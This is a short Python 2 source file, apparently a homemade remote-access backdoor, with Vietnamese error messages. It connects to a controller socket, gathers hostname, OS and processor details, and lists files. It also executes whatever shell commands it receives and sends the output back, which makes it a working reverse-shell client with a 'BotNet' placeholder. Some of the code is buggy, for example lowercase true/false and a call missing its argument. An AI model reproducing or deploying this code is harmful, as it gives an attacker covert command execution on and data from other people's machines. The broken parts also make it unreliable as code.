# To change this license header, choose License Headers in Project Properties.
# To change this template file, choose Tools | Templates
# and open the template in the editor.

__author__ = "PPT"
__date__ = "$May 20, 2016 11:32:00 AM$"

import socket, os, platform, glob, subprocess


def SelectMenu(sel):
    if sel == '1':
        return GetInfo()
    elif sel == '2':
        return str(ListFile('D:\\', ['*.*']))
    elif sel == '3':
        return CMD()
        pass
    elif sel == '4':
        #BotNet
        pass
    else:
        return sel
        pass

def GetInfo():
    return "\r\n".join([
        "PC Name: " + socket.gethostname(),
        "Machine: " + platform.machine(),
        "Version: " + platform.version(),
        "System: " + platform.system(),
        "Processor: " + platform.processor()])

def File(dir, bag, wildcards):    
    if glob.glob(os.path.join(dir, "*")):
        bag.extend(glob.glob(os.path.join(dir, wildcards)))
        File(os.path.join(dir, "*"), bag, wildcards)

def ListFile(dir, a):
    files = []
    for ext in a:
        File(dir, files, ext)
    return "\r\n".join(files)

def CMD(cmt):
    p = subprocess.Popen(cmt, stdout=subprocess.PIPE, shell=True)
    out, err = p.communicate()
    if out:
        return str(out)
    if err:
        return str(err)
    
def BotNet():
    return true

def Error():
    return false



if __name__ == "__main__":
    #CMD("sdssads")
    os.spawnl(os.P_DETACH, 'some_long_running_command')
    s = socket.socket()         # Create a socket object
    host = socket.gethostname() # Get local machine name
    #host = '172.20.10.2'
    port = 12345                # Reserve a port for your service.
    x= True
    sel= 0
    while x == True:
        try:
            s.connect((host, port))
            x= False
        except:
            print "Loi ket noi"
    while True:
        try:
            data = s.recv(10240)
            if(data == '1' or data == '3' ):
                sel = data
                s.send("Chon: " + sel)
            elif(sel == '1'):
                s.send(str(GetInfo()))
            elif(sel == '3'):
                s.send(str(CMD(data)))
    
            #s.send(str(SelectMenu(data)))
            #print SelectMenu(data)
        except:
            print sel
            print "Loi"
            pass
    s.close
